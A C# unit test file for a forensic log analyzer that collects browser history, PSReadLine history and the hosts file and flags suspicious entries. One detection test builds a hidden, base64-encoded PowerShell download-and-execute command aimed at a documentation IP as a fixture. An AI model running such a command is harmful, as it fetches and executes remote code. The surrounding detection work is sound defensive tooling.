using System.Text;
using LogAnalyzer.Dfir.Analysis;
using LogAnalyzer.Dfir.Case;
using LogAnalyzer.Dfir.Integrity;
using LogAnalyzer.Dfir.Model;
using LogAnalyzer.Dfir.Network;
using LogAnalyzer.Dfir.Scripting;
using LogAnalyzer.Dfir.Windows.Acquisition;
using LogAnalyzer.Dfir.Windows.Investigation;
using LogAnalyzer.Dfir.Windows.Parsers;
using Xunit;

namespace LogAnalyzer.Dfir.Tests;

/// <summary>Planner #11 A6: live collection of browser history, PSReadLine history and the hosts file, the two small parsers and their findings. Synthetic tiny files only.</summary>
public sealed class UserHistoryTests : IDisposable
{
    private readonly string _dir = Path.Combine(Path.GetTempPath(), "ladfir_uh_" + Guid.NewGuid().ToString("N"));
    private const string Sid1 = "S-1-5-21-1111111111-2222222222-3333333333-1001";
    private const string Sid2 = "S-1-5-21-1111111111-2222222222-3333333333-1002";

    public UserHistoryTests() => Directory.CreateDirectory(_dir);

    public void Dispose()
    {
        try
        {
            foreach (var f in Directory.EnumerateFiles(_dir, "*", SearchOption.AllDirectories)) File.SetAttributes(f, FileAttributes.Normal);
            Directory.Delete(_dir, true);
        }
        catch (IOException) { }
    }

    private static readonly byte[] Sqlite = [.. "SQLite format 3\0"u8, .. new byte[48]];

    private string Put(string relative, byte[]? bytes = null)
    {
        var path = Path.Combine(_dir, relative);
        Directory.CreateDirectory(Path.GetDirectoryName(path)!);
        File.WriteAllBytes(path, bytes ?? Sqlite);
        return path;
    }

    private string PutText(string relative, string text)
    {
        var path = Path.Combine(_dir, relative);
        Directory.CreateDirectory(Path.GetDirectoryName(path)!);
        File.WriteAllText(path, text, new UTF8Encoding(false));
        return path;
    }

    private string Profile(string user) => Path.Combine(_dir, "vol", "Users", user);

    private (CollectorOutcome Outcome, CaseWorkspace Case) Collect(long maxBytes = UserHistoryCollector.MaxBrowserDbBytes,
        Func<string, string, string, string, CancellationToken, VssCopyResult>? vss = null)
    {
        var ws = InvestigationPipeline.NewCase(Path.Combine(_dir, "cases"), "uh", TestScopes.Valid());
        var c = new UserHistoryCollector(() => [new UserProfileEntry(Sid1, Profile("u1")), new UserProfileEntry(Sid2, Profile("u2"))],
            vss ?? ((s, d, l, lab, ct) => throw new InvalidOperationException("no shadow copy in this test")), () => new HashSet<string>(),
            Path.Combine(_dir, "etc", "hosts"), maxBytes);
        return (c.Collect(new CollectorContext { Case = ws, IsElevated = true }, default), ws);
    }

    // ---- collection ----

    [Fact]
    public void The_collector_registers_browser_history_psreadline_and_hosts_of_two_users_with_the_right_source_types_and_copies_the_wal_beside_the_database()
    {
        // user 1: Chrome Default (+ -wal), Edge Profile 1, Firefox profile (+ -wal), PSReadLine; user 2: Chrome Default, Brave Default, PSReadLine
        Put(@"vol\Users\u1\AppData\Local\Google\Chrome\User Data\Default\History");
        Put(@"vol\Users\u1\AppData\Local\Google\Chrome\User Data\Default\History-wal", [1, 2, 3]);
        Put(@"vol\Users\u1\AppData\Local\Microsoft\Edge\User Data\Profile 1\History");
        Put(@"vol\Users\u1\AppData\Roaming\Mozilla\Firefox\Profiles\ab12.default-release\places.sqlite");
        Put(@"vol\Users\u1\AppData\Roaming\Mozilla\Firefox\Profiles\ab12.default-release\places.sqlite-wal", [4, 5]);
        PutText(@"vol\Users\u1\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt", "Get-Process\r\nwhoami\r\n");
        Put(@"vol\Users\u2\AppData\Local\Google\Chrome\User Data\Default\History");
        Put(@"vol\Users\u2\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History");
        PutText(@"vol\Users\u2\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt", "ipconfig\r\n");
        // not history: a non-profile folder and the Chrome "System Profile" must not be taken
        Put(@"vol\Users\u2\AppData\Local\Google\Chrome\User Data\System Profile\History");
        PutText(@"etc\hosts", "# Copyright (c) 1993-2009 Microsoft Corp.\r\n127.0.0.1 localhost\r\n::1 localhost\r\n");

        var (o, ws) = Collect();

        Assert.Empty(o.Errors);
        Assert.Equal(EvidenceStatus.Success, o.Status);
        int Count(string t) => o.Evidence.Count(e => e.SourceType == t);
        Assert.Equal(4, Count("chromium_history"));      // u1 Chrome, u1 Edge, u2 Chrome, u2 Brave
        Assert.Equal(1, Count("firefox_places"));
        Assert.Equal(1, Count(UserHistoryCollector.ChromiumWalSourceType));
        Assert.Equal(1, Count(UserHistoryCollector.FirefoxWalSourceType));
        Assert.Equal(2, Count(PsReadLineHistoryParser.SourceTypeName));
        Assert.Equal(1, Count(HostsFileParser.SourceTypeName));
        Assert.Equal(10, o.Evidence.Count);

        var chrome = o.Evidence.Single(e => e.SourceType == "chromium_history" && e.Source.StartsWith($"BrowserHistory:{Sid1}:Chrome", StringComparison.Ordinal));
        var wal = o.Evidence.Single(e => e.SourceType == UserHistoryCollector.ChromiumWalSourceType);
        var chromeStored = Path.Combine(ws.Root, chrome.StoredPath);
        Assert.Equal("History", Path.GetFileName(chromeStored));
        Assert.Equal(chromeStored + "-wal", Path.Combine(ws.Root, wal.StoredPath));   // the parser looks for <database>-wal
        Assert.Equal([1, 2, 3], File.ReadAllBytes(chromeStored + "-wal"));
        Assert.Contains("History-wal", chrome.Notes);
        Assert.All(o.Evidence, e => Assert.Equal(64, e.Sha256.Length));
        var ps = o.Evidence.Where(e => e.SourceType == PsReadLineHistoryParser.SourceTypeName).Select(e => e.Source).OrderBy(s => s).ToArray();
        Assert.Equal([$"PSReadLine:{Sid1}", $"PSReadLine:{Sid2}"], ps);
        Assert.DoesNotContain(o.Evidence, e => e.StoredPath.Contains("System Profile", StringComparison.Ordinal));
        // the source is never modified
        Assert.Equal([1, 2, 3], File.ReadAllBytes(Path.Combine(_dir, @"vol\Users\u1\AppData\Local\Google\Chrome\User Data\Default\History-wal")));
    }

    [Fact]
    public void A_database_over_the_size_cap_is_a_reported_gap_and_is_not_copied_with_its_wal_and_the_small_files_are_still_taken()
    {
        Put(@"vol\Users\u1\AppData\Local\Google\Chrome\User Data\Default\History", new byte[200]);
        Put(@"vol\Users\u1\AppData\Local\Google\Chrome\User Data\Default\History-wal", [1]);
        PutText(@"vol\Users\u1\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt", "whoami\r\n");
        PutText(@"etc\hosts", "127.0.0.1 localhost\r\n");

        var (o, _) = Collect(maxBytes: 100);

        Assert.Contains(o.Errors, e => e.Contains("Chrome") && e.Contains("200 octeți, peste limita de 100") && e.Contains("lacună"));
        Assert.DoesNotContain(o.Evidence, e => e.SourceType == "chromium_history");
        Assert.Equal(1, o.Evidence.Count(e => e.SourceType == PsReadLineHistoryParser.SourceTypeName));
        Assert.Equal(1, o.Evidence.Count(e => e.SourceType == HostsFileParser.SourceTypeName));
        Assert.Equal(EvidenceStatus.Partial, o.Status);
    }

    [Fact]
    public void Every_history_txt_of_the_PSReadLine_folder_is_collected_not_only_ConsoleHost_and_other_files_are_not()
    {
        const string folder = @"vol\Users\u1\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\";
        PutText(folder + "ConsoleHost_history.txt", "whoami\r\n");
        PutText(folder + "Visual Studio Code Host_history.txt", "Get-Process\r\nipconfig\r\n");   // the VS Code integrated terminal
        PutText(folder + "notes.txt", "not a history");
        PutText(folder + "ConsoleHost_history.txt.bak", "old copy");
        PutText(@"vol\Users\u2\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt", "ipconfig\r\n");
        PutText(@"etc\hosts", "127.0.0.1 localhost\r\n");

        var (o, ws) = Collect();

        var ps = o.Evidence.Where(e => e.SourceType == PsReadLineHistoryParser.SourceTypeName).ToList();
        Assert.Equal(3, ps.Count);
        Assert.Equal(["ConsoleHost_history.txt", "Visual Studio Code Host_history.txt"], ps.Where(e => e.Source == $"PSReadLine:{Sid1}").Select(e => Path.GetFileName(e.OriginalPath)).OrderBy(n => n));
        var vsc = ps.Single(e => e.OriginalPath.EndsWith("Visual Studio Code Host_history.txt", StringComparison.Ordinal));
        Assert.Equal("Visual Studio Code Host_history.txt", Path.GetFileName(vsc.StoredPath));
        Assert.Equal("Get-Process\r\nipconfig\r\n", File.ReadAllText(Path.Combine(ws.Root, vsc.StoredPath)));
        Assert.Contains("Visual Studio Code Host_history.txt", vsc.Notes);
        Assert.DoesNotContain(ps, e => e.OriginalPath.EndsWith("notes.txt", StringComparison.Ordinal) || e.OriginalPath.EndsWith(".bak", StringComparison.Ordinal));
    }

    [Fact]
    public void A_VS_Code_history_file_is_parsed_with_the_same_parser_and_rules_as_ConsoleHost_and_typed_on_import()
    {
        var path = PutText("vsc\\Visual Studio Code Host_history.txt", "Get-ChildItem\r\npowershell -w hidden -enc SQBFAFgA\r\n");
        var e = Parse(new Ps(), path, PsReadLineHistoryParser.SourceTypeName, "PSReadLine:" + Sid1);
        Assert.Equal(2, e.Count);
        Assert.All(e, x => Assert.Equal("PsReadLineHistory", x.Source));
        Assert.Equal(PsReadLineHistoryParser.SourceTypeName, InvestigationPipeline.ImportType(path));
    }

    [Fact]
    public void A_database_held_open_by_the_browser_falls_back_to_the_shadow_copy_and_the_note_says_so()
    {
        var db = Put(@"vol\Users\u1\AppData\Local\Google\Chrome\User Data\Default\History");
        using var held = new FileStream(db, FileMode.Open, FileAccess.Read, FileShare.None);   // a running browser: no other opener is allowed
        int calls = 0;
        var (o, ws) = Collect(vss: (s, d, l, lab, ct) =>
        {
            calls++;
            Assert.Equal(db, s);
            File.WriteAllBytes(d, [.. Sqlite, 9]);
            return new VssCopyResult(0, "esentutl /y ... /vss");
        });
        Assert.Equal(1, calls);
        var item = Assert.Single(o.Evidence, e => e.SourceType == "chromium_history");
        Assert.Contains("copia de umbră VSS", item.Notes);
        Assert.Equal(Sqlite.Length + 1, new FileInfo(Path.Combine(ws.Root, item.StoredPath)).Length);
    }

    [Fact]
    public void A_locked_database_without_a_working_shadow_copy_is_reported_not_registered()
    {
        var db = Put(@"vol\Users\u1\AppData\Local\Microsoft\Edge\User Data\Default\History");
        using var held = new FileStream(db, FileMode.Open, FileAccess.Read, FileShare.None);
        var (o, _) = Collect(vss: (s, d, l, lab, ct) => new VssCopyResult(1, "esentutl failed"));
        Assert.DoesNotContain(o.Evidence, e => e.SourceType == "chromium_history");
        Assert.Contains(o.Errors, e => e.Contains("Edge") && e.Contains("copia de umbră a eșuat"));
    }

    [Fact]
    public void Nothing_is_collected_and_nothing_fails_on_a_station_without_these_files()
    {
        Directory.CreateDirectory(Profile("u1")); Directory.CreateDirectory(Profile("u2"));
        var ws = InvestigationPipeline.NewCase(Path.Combine(_dir, "cases"), "uh", TestScopes.Valid());
        var o = new UserHistoryCollector(() => [new UserProfileEntry(Sid1, Profile("u1"))], null, () => new HashSet<string>(), Path.Combine(_dir, "none", "hosts"))
            .Collect(new CollectorContext { Case = ws, IsElevated = true }, default);
        Assert.Empty(o.Evidence);
        Assert.Contains(o.Errors, e => e.Contains("hosts lipsește"));
    }

    [Fact]
    public void The_collector_is_in_the_standard_and_full_profiles_and_the_parsers_are_registered()
    {
        var c = new UserHistoryCollector();
        Assert.True(c.Profiles.HasFlag(CollectionProfile.Standard) && c.Profiles.HasFlag(CollectionProfile.FullForensic) && !c.Profiles.HasFlag(CollectionProfile.Quick));
        Assert.Contains(InvestigationPipeline.AllCollectors, x => x is UserHistoryCollector);
        var ids = WindowsParsers.Registry.Descriptors.Select(d => d.ParserId).ToList();
        Assert.Contains("PsReadLineHistoryParser", ids);
        Assert.Contains("HostsFileParser", ids);
        Assert.DoesNotContain("necolectat", ParserCapabilities.For("PowerShellTranscriptParser")!.CorrelationSources.Aggregate("", (a, b) => a + b));
    }

    [Fact]
    public void The_registry_selects_the_new_parsers_for_collected_text_even_when_a_command_starts_with_a_bracket()
    {
        var ps = PutText("ps\\ConsoleHost_history.txt", "[System.Net.ServicePointManager]::SecurityProtocol\r\nwhoami\r\n");
        var hosts = PutText("h\\hosts", "127.0.0.1 localhost\r\n");
        var psItem = new EvidenceItem { EvidenceId = "E-1", CaseId = "C", Source = "PSReadLine:" + Sid1, SourceType = PsReadLineHistoryParser.SourceTypeName, StoredPath = ps };
        var hItem = new EvidenceItem { EvidenceId = "E-2", CaseId = "C", Source = "Hosts", SourceType = HostsFileParser.SourceTypeName, StoredPath = hosts };
        Assert.Equal("PsReadLineHistoryParser", Assert.Single(WindowsParsers.Registry.Select(psItem, ps).Parsers).Descriptor.ParserId);
        Assert.Equal("HostsFileParser", Assert.Single(WindowsParsers.Registry.Select(hItem, hosts).Parsers).Descriptor.ParserId);
        Assert.Equal(PsReadLineHistoryParser.SourceTypeName, InvestigationPipeline.ImportType(ps));
        Assert.Equal(HostsFileParser.SourceTypeName, InvestigationPipeline.ImportType(hosts));
    }

    // ---- parsers ----

    private static List<TimelineEvent> Parse(IEvidenceParserLike p, string path, string type, string source = "test")
    {
        var sink = new ListSink();
        var item = new EvidenceItem { EvidenceId = "EV-1", CaseId = "C", Source = source, SourceType = type, StoredPath = path };
        var r = p.Parse(item, path, sink);
        Assert.NotEqual(EvidenceStatus.Failed, r.Status);
        return sink.Events;
    }

    private interface IEvidenceParserLike { ParseResult Parse(EvidenceItem i, string path, IEventSink s); }
    private sealed class Ps : IEvidenceParserLike { public ParseResult Parse(EvidenceItem i, string p, IEventSink s) => new PsReadLineHistoryParser().Parse(i, p, s, default); }
    private sealed class Hosts : IEvidenceParserLike { public ParseResult Parse(EvidenceItem i, string p, IEventSink s) => new HostsFileParser().Parse(i, p, s, default); }

    [Fact]
    public void The_psreadline_parser_gives_one_event_per_non_blank_line_with_the_physical_line_number_as_locator_and_the_raw_line_unchanged()
    {
        var path = PutText("ps1\\ConsoleHost_history.txt", "\uFEFFGet-Process\r\n\r\n   whoami /all  \r\ncd 'C:\\Users\\Ana'\r\n");
        var e = Parse(new Ps(), path, PsReadLineHistoryParser.SourceTypeName, "PSReadLine:" + Sid1);
        Assert.Equal(["line=1", "line=3", "line=4"], e.Select(x => x.Locator).ToArray());
        Assert.Equal(["Get-Process", "   whoami /all  ", "cd 'C:\\Users\\Ana'"], e.Select(x => x.Fields["RawLine"]).ToArray());
        Assert.Equal("whoami /all", e[1].Fields["Command"]);
        Assert.All(e, x => { Assert.Equal("PsReadLineHistory", x.Source); Assert.False(x.Time.IsKnown); Assert.Equal(Sid1, x.Fields["Profile"]); Assert.Equal(Classification.Direct, x.Classification); });
        // the A1 quote is the original line
        Assert.Equal("   whoami /all  ".Trim(), EvidenceQuote.From(e[1]).Quote);
        Assert.Equal(EvidenceQuote.UnknownTimeSource, EvidenceQuote.From(e[1]).TimeSource);
    }

    [Fact]
    public void The_hosts_parser_gives_one_event_per_entry_skips_comments_and_keeps_the_raw_line()
    {
        var path = PutText("h1\\hosts", "# Copyright\r\n\r\n127.0.0.1       localhost  # loop\r\n::1 localhost\r\n  10.0.0.5\tupdate.microsoft.com  www.microsoft.com\r\nnotanip example.org\r\n");
        var e = Parse(new Hosts(), path, HostsFileParser.SourceTypeName);
        Assert.Equal(["line=3", "line=4", "line=5", "line=6"], e.Select(x => x.Locator).ToArray());
        Assert.Equal("127.0.0.1       localhost  # loop", e[0].Fields["RawLine"]);
        Assert.Equal("10.0.0.5", e[2].Fields["IpAddress"]);
        Assert.Equal("update.microsoft.com www.microsoft.com", e[2].Fields["Hostnames"]);
        Assert.Equal("nu (Windows ignoră rândul)", e[3].Fields["Valid"]);
        Assert.Equal("10.0.0.5 update.microsoft.com  www.microsoft.com", EvidenceQuote.From(e[2]).Quote);   // the tab is shown as a space
    }

    // ---- findings ----

    private List<TimelineEvent> HostsEvents(string text) => Parse(new Hosts(), PutText("hf" + Guid.NewGuid().ToString("N") + "\\hosts", text), HostsFileParser.SourceTypeName);

    [Fact]
    public void A_hosts_entry_that_redirects_a_microsoft_domain_is_a_high_finding_with_the_line_quoted_and_the_default_file_gives_none()
    {
        Assert.DoesNotContain(Correlation.Run(HostsEvents("# Copyright (c) 1993-2009 Microsoft Corp.\r\n127.0.0.1 localhost\r\n::1 localhost\r\n")),
            x => x.RuleId.StartsWith("HOSTS-", StringComparison.Ordinal));

        var e = HostsEvents("127.0.0.1 localhost\r\n203.0.113.9 download.windowsupdate.com\r\n");
        var f = Assert.Single(Correlation.Run(e), x => x.RuleId.StartsWith("HOSTS-", StringComparison.Ordinal));
        Assert.Equal("HOSTS-SECURITY-DOMAIN", f.RuleId);
        Assert.Equal(Severity.High, f.Severity);
        Assert.Equal(Classification.Direct, f.Classification);
        Assert.Contains("203.0.113.9 download.windowsupdate.com", f.Description);
        Assert.Equal("line=2", f.SupportingEvidence[0].Locator);
        Assert.Contains("rândul 2", f.SupportingEvidence[0].Description);
        var refs = f.SupportingEvidence.ToList();
        EvidenceQuote.Bind(refs, EvidenceQuote.Index(e));
        Assert.Equal("203.0.113.9 download.windowsupdate.com", refs[0].Quote);
        Assert.Contains(RuleContracts.All, c => c.RuleId == "HOSTS-SECURITY-DOMAIN");
        Assert.Contains(RuleContracts.All, c => c.RuleId == "HOSTS-REDIRECT");
    }

    [Theory]
    [InlineData("0.0.0.0 vortex.data.microsoft.com", "HOSTS-SECURITY-DOMAIN", Severity.Medium)]
    [InlineData("127.0.0.1 update.kaspersky.com", "HOSTS-SECURITY-DOMAIN", Severity.Medium)]
    [InlineData("192.168.1.20 intranet.example.org", "HOSTS-REDIRECT", Severity.Low)]
    [InlineData("10.1.1.1 MICROSOFT.COM", "HOSTS-SECURITY-DOMAIN", Severity.High)]
    public void Blocked_security_names_and_other_network_mappings_get_their_own_rule_and_severity(string line, string rule, Severity severity)
    {
        var f = Assert.Single(Correlation.Run(HostsEvents(line + "\r\n")), x => x.RuleId.StartsWith("HOSTS-", StringComparison.Ordinal));
        Assert.Equal(rule, f.RuleId);
        Assert.Equal(severity, f.Severity);
    }

    [Theory]
    [InlineData("0.0.0.0 ads.example.net")]
    [InlineData("127.0.0.1 tracker.example.net")]
    [InlineData("0.0.0.0 notmicrosoft.com")]
    public void Blocking_other_names_and_look_alike_domains_give_no_finding(string line)
    {
        Assert.DoesNotContain(Correlation.Run(HostsEvents(line + "\r\n")), x => x.RuleId.StartsWith("HOSTS-", StringComparison.Ordinal));
    }

    [Fact]
    public void A_suspicious_psreadline_command_is_a_direct_finding_that_quotes_the_line_and_cites_line_N_and_a_normal_one_gives_none()
    {
        var bad = "powershell -nop -w hidden -e " + Convert.ToBase64String(Encoding.Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')"));
        var path = PutText("ps2\\ConsoleHost_history.txt", "Get-ChildItem\r\n\r\n" + bad + "\r\nwhoami\r\n");
        var e = Parse(new Ps(), path, PsReadLineHistoryParser.SourceTypeName, "PSReadLine:" + Sid1);
        var findings = Correlation.Run(e).Where(x => x.RuleId == "PS-HISTORY-SUSPICIOUS").ToList();
        var f = Assert.Single(findings);
        Assert.Equal(Classification.Direct, f.Classification);
        Assert.Equal("line=3", f.SupportingEvidence[0].Locator);
        Assert.Contains("rândul 3", f.Description);
        Assert.Contains("DownloadString", f.Description);   // decoded
        Assert.Null(f.FirstSeenUtc);                        // the file has no times: none is invented
        var refs = f.SupportingEvidence.ToList();
        EvidenceQuote.Bind(refs, EvidenceQuote.Index(e));
        Assert.Equal(bad, refs[0].Quote);
        Assert.StartsWith("powershell -nop -w hidden -e ", refs[0].Quote);
        Assert.DoesNotContain(Correlation.Run(e), x => x.RuleId == "PS-CMDLINE-SUSPICIOUS");
        Assert.Contains(RuleContracts.All, c => c.RuleId == "PS-HISTORY-SUSPICIOUS");

        var benign = Parse(new Ps(), PutText("ps3\\ConsoleHost_history.txt", "Get-ChildItem\r\ncd ..\r\nwhoami\r\n"), PsReadLineHistoryParser.SourceTypeName);
        Assert.DoesNotContain(Correlation.Run(benign), x => x.RuleId == "PS-HISTORY-SUSPICIOUS");
    }
}
